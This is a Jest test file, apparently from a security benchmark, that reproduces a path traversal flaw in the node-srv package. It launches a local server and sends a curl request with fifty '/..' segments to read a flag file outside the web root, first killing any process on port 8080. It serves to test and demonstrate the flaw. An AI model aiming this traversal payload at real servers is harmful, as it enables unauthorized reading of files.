const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v285 = '/..'.repeat(50);
    const v286 = v285 + pathToFlag;
    return v286;
};
const v301 = done => {
    const v287 = expect.assertions(1);
    v287;
    let Server = require('node-srv');
    const fs = require('fs');
    const v288 = require('child_process');
    const exec = v288.exec;
    const v289 = fs.readFileSync(pathToFlag);
    let hostsFile = v289.toString();
    const a = require('child_process');
    try {
        const v290 = () => {
        };
        const v291 = a.execSync('fuser -k 8080/tcp', v290);
        v291;
    } catch (e) {
    }
    const v292 = {
        port: 8080,
        root: './',
        logs: true
    };
    const v293 = function () {
    };
    let srv = new Server(v292, v293);
    const v294 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${ v294 }"`;
    const v299 = (error, stdout) => {
        const v295 = expect(stdout);
        const v296 = v295.toBe(hostsFile);
        v296;
        const v297 = srv.stop();
        v297;
        const v298 = done();
        v298;
    };
    const v300 = exec(attack_string, v299);
    v300;
};
const v302 = test('Path Traversal in node-srv', v301);
v302;